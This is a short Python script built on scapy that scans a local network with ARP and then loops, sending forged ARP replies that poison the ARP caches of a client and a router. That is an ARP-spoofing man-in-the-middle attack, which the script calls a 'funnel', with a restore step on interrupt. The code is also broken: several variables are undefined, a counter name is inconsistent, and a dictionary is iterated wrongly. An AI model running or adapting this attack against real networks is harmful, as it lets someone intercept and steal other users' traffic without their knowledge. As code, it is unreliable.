import scapy.all as scapy
import socket
import psutil
import sys
import uuid
import time


def createARPpackage(ip, mac, ipTo, op=2):
    return scapy.ARP(
        op=op,
        pdst=ipTo,
        hwdst=mac,
        psrc=ip
    )  # send to [ipTo]: [ip] has [mac] mac addr.


def sendPackage(package, to):
    return scapy.srp(
        scapy.Ether(
            dst=to
        ) / package,
        timeout=1,
        verbose=False
    )


def getMyMac():
    mac = uuid.UUID(int=uuid.getnode()).hex[-12:]
    return ':'.join([mac[e:e + 2] for e in range(0, 12, 2)])


def scan(ip):
    arpPacket = scapy.ARP( # arp request WHO HAS (1) (as default)
			pdst = ip
		)

    broadcast = scapy.Ether(
        dst="ff:ff:ff:ff:ff:ff" # destination (who will take)
    ) # outer shell for sending pack

    arpPush = broadcast / arpPacket

    return scapy.srp(arpPush, timeout=10, verbose=False)[0]

def get_ip_by_interface(interface_name):
    net_if_addrs = psutil.net_if_addrs()
    if interface_name in net_if_addrs:
        for addr in net_if_addrs[interface_name]:
            if addr.family == socket.AF_INET:
                return addr.address
    return None


def main():
    myIp = get_ip_by_interface(sys.argv[1])
    if myIp is None:
        print('Cannot recognize local ip')
        sys.exit(1)

    myMac = getMyMac()

    print(f'Machine IP: {myIp}  MAC: {myMac}')

    networkScan = {}
    for _ in range(20):
        for cl in scan(myIp):
            networkScan[cl.answer.psrc] = cl.answer.hwsrc
        print(f'[{_}] Scan ')

    for host, mac in networkScan:
        print(host, '  ', mac)

    print(f'interface: {sys.argv[1]}\nIp: {myIp}')
    input('Press Enter to start funnel.')


    sentPackCount = 0

    while True:
        try:
            sendPackage(createARPpackage(clientIP, myMac, routerIp), 'ff:ff:ff:ff:ff:ff')
            sendPackage(createARPpackage(routerIp, myMac, clientIP), 'ff:ff:ff:ff:ff:ff')

            sendedPackCount += 2
            print(f'[{sendedPackCount}] sent package'),

            time.sleep(1)
        except KeyboardInterrupt:
            sendPackage(createARPpackage(clientIP, clientMac, routerIp), 'ff:ff:ff:ff:ff:ff')
            sendPackage(createARPpackage(routerIp, routerMac, clientIP), 'ff:ff:ff:ff:ff:ff')
            print('Arp table has been restored.')

            exit()


if __name__ == '__main__': main()